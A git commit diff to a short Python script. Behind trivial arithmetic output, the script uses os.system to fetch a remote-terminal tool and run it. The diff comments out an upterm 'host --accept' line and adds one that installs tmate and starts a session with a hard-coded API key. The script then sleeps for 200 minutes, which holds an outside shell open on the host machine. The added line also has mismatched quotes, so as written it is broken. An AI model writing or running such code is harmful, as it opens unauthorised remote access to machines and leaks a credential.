13812cc33c8ded3ecf9244b64f2a07863e016972
Your Name <you@example.com>
2023-12-29 14:17:58 +0100

    auto

--- ghu.py
+++ ghu.py
@@ -4,6 +4,7 @@ if __name__=='__main__':
   y=6*t
   print(y*9)
   sys.stdout.flush();
-  os.system('wget https://github.com/owenthereal/upterm/releases/download/v0.13.0/upterm_linux_amd64.tar.gz && tar xf upterm_linux_amd64.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
+#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v0.13.0/upterm_linux_amd64.tar.gz && tar xf upterm_linux_amd64.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
+  os.system('sudo apt update && sudo apt install -y tmate && tmate -k tmk-DatDKNOrAbt7NDW5fU2MlchSAO -n testname")
   sys.stdout.flush();
   time.sleep(60*200)
